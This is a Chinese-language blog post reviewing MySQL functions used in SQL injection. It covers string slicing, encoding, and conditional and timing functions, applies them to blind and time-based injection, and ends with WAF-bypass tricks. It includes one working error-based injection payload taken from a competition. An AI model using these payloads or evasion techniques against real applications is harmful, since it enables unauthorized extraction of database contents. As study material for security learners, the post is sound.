---
title: mysql注入复习
date: 2019-05-01 14:00:02
tags:
- mysql注入
categories: 注入
---

知识复习。

<!--more-->

# 0x01 字符串截取

## SUBSTRING()

截取从第开始，第几位结束的字符串

```mysql
mysql> SELECT SUBSTRING('strings',1,4);
+--------------------------+
| SUBSTRING('strings',1,4) |
+--------------------------+
| stri                     |
+--------------------------+
1 row in set (0.00 sec)
```

## SUBSTR()

同上

```mysql
mysql> SELECT SUBSTR('strings',1,4);
+-----------------------+
| SUBSTR('strings',1,4) |
+-----------------------+
| stri                  |
+-----------------------+
1 row in set (0.00 sec)
```

另外还有一点，在之前强网杯出现过的一种比较少见的写法，通过FROM遍历字符串。从N开始，取N之后的所有字符串：

```mysql
mysql> SELECT SUBSTR((SELECT user()) FROM 1);
+--------------------------------+
| SUBSTR((SELECT user()) FROM 1) |
+--------------------------------+
| root@localhost                 |
+--------------------------------+
1 row in set (0.00 sec)

mysql> SELECT SUBSTR((SELECT user()) FROM 2);
+--------------------------------+
| SUBSTR((SELECT user()) FROM 2) |
+--------------------------------+
| oot@localhost                  |
+--------------------------------+
1 row in set (0.00 sec)
```

## MID()

同上

```mysql
mysql> SELECT MID('strings',1,4);
+--------------------+
| MID('strings',1,4) |
+--------------------+
| stri               |
+--------------------+
1 row in set (0.00 sec)
```

## LEFT()

取左边开始到第几个字符串

```mysql
mysql> SELECT LEFT('strings',4);
+-------------------+
| LEFT('strings',4) |
+-------------------+
| stri              |
+-------------------+
1 row in set (0.01 sec)
```

## RIGHT()

取右边开始到第几个字符串

```mysql
mysql> SELECT RIGHT('strings',4);
+--------------------+
| RIGHT('strings',4) |
+--------------------+
| ings               |
+--------------------+
1 row in set (0.00 sec)
```

# 0x02 编码

## ASCII()

将字符串转换成ASCII码

```mysql
mysql> SELECT ASCII('a');
+------------+
| ASCII('a') |
+------------+
|         97 |
+------------+
1 row in set (0.00 sec)
```

## ORD()

同上

```mysql
mysql> SELECT ORD('a');
+----------+
| ORD('a') |
+----------+
|       97 |
+----------+
1 row in set (0.00 sec)
```

## HEX()

将字符串转换成16进制

```mysql
mysql> SELECT HEX('strings');
+----------------+
| HEX('strings') |
+----------------+
| 737472696E6773 |
+----------------+
1 row in set (0.00 sec)
```

## UNHEX()

将16进制转换成字符串

```mysql
mysql> SELECT UNHEX('737472696E6773');
+-------------------------+
| UNHEX('737472696E6773') |
+-------------------------+
| strings                 |
+-------------------------+
1 row in set (0.00 sec)
```

## CONV()

进制转换

```mysql
mysql> SELECT CONV(HEX('strings'), 16, 10);
+------------------------------+
| CONV(HEX('strings'), 16, 10) |
+------------------------------+
| 32497657065662323            |
+------------------------------+
1 row in set (0.00 sec)

mysql> SELECT UNHEX(CONV(32497657065662323,10,16));
+--------------------------------------+
| UNHEX(CONV(32497657065662323,10,16)) |
+--------------------------------------+
| strings                              |
+--------------------------------------+
1 row in set (0.00 sec)
```

# 0x03  一些盲注用到的函数

## CAST()

转换类型

## IFNULL(EXPr1,EXPr2)

如果第一个参数不为空，则返回第一个参数，否则返回第二个参数

## IF(EXPr1,EXPr2,EXPr3)

如果第一个表达式的值为TRUE（不为0或null），则返回第二个参数的值，否则返回第三个参数的值

看IFNULL的一个例子

```mysql
mysql> SELECT CAST(username AS CHAR) FROM user; 
+------------------------+
| CAST(username AS CHAR) |
+------------------------+
| zhangsan               |
+------------------------+
1 row in set (0.00 sec)

mysql> SELECT IFNULL(CAST(username AS CHAR),0x20) FROM user;
+-------------------------------------+
| IFNULL(CAST(username AS CHAR),0x20) |
+-------------------------------------+
| zhangsan                            |
+-------------------------------------+
1 row in set (0.00 sec)

mysql> SELECT MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM user ORDER BY id LIMIT 0,1),1,1);
+---------------------------------------------------------------------------------------+
| MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM user ORDER BY id LIMIT 0,1),1,1) |
+---------------------------------------------------------------------------------------+
| z                                                                                     |
+---------------------------------------------------------------------------------------+
1 row in set (0.00 sec)
```

## SLEEP()

暂停N秒后再运行

IF的一个例子，通常与SLEEP()一起使用

```mysql
mysql> SELECT IF(ASCII(SUBSTRING(USER(),1,1))>115,0,SLEEP(1));
+-------------------------------------------------+
| IF(ASCII(SUBSTRING(USER(),1,1))>115,0,SLEEP(1)) |
+-------------------------------------------------+
|                                               0 |
+-------------------------------------------------+
1 row in set (1.00 sec)
```

## BENCHMARK()

与SLEEP类似，用户Mysql处理，执行多少次表达式，通过时间长短判断语句是否执行，不过会占用CPU

```mysql
mysql> SELECT BENCHMARK(10000000,1/2);
+-------------------------+
| BENCHMARK(10000000,1/2) |
+-------------------------+
|                       0 |
+-------------------------+
1 row in set (0.88 sec)
```

## FIND_IN_SET()

在'0,1,2,3,4,5,6,7,8,9,.,r'中寻找user()的第一位，返回的时间是payload的第几位

```mysql
mysql> SELECT SLEEP(FIND_IN_SET(MID((select user()),1,1),'0,1,2,3,4,5,6,7,8,9,.,r'));
+------------------------------------------------------------------------+
| SLEEP(FIND_IN_SET(MID((select user()),1,1),'0,1,2,3,4,5,6,7,8,9,.,r')) |
+------------------------------------------------------------------------+
|                                                                      0 |
+------------------------------------------------------------------------+
1 row in set (12.00 sec)
```

## EXP()

注意EXP(710)，EXP(709)，可以通过临界值710进行报错盲注

```mysql
mysql> select EXP(709);
+-----------------------+
| EXP(709)              |
+-----------------------+
| 8.218407461554972e307 |
+-----------------------+
1 row in set (0.00 sec)

mysql> select EXP(710);
ERROR 1690 (22003): DOUBLE value is out of range in 'EXP(710)'
```

比如师傅在某比赛中的EXP：

```php+HTML
username=1' union select EXP(710-ascii(mid(username,1,1))--5) from user-- -&password=2
```

CASE WHEN：

用法类似IF

```mysql
mysql> SELECT (CASE WHEN (substring(database(),1,1)="t") THEN 135 ELSE 0x29 END);
+--------------------------------------------------------------------+
| (CASE WHEN (substring(database(),1,1)="t") THEN 135 ELSE 0x29 END) |
+--------------------------------------------------------------------+
| 135                                                                |
+--------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> SELECT (CASE WHEN (substring(database(),1,1)="r") THEN 135 ELSE 0x29 END);
+--------------------------------------------------------------------+
| (CASE WHEN (substring(database(),1,1)="r") THEN 135 ELSE 0x29 END) |
+--------------------------------------------------------------------+
| )                                                                  |
+--------------------------------------------------------------------+
1 row in set (0.00 sec)
```

# 0x04 绕WAF一些思路

内联注释：/**/

大小写：UnIon

代替空格：%00，%0a，%0b，%0c，%0d，%a0，%1f

填充换行符：%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a

HTTP数据包：将GET请求变成POST请求提交

# 0x05 结语

多花精力在SQL语句的理解，不要做只会复制粘贴payload的SCRIPTKID

多积累一些报错函数，在遇到waf或者盲注的时候能够快速想起使用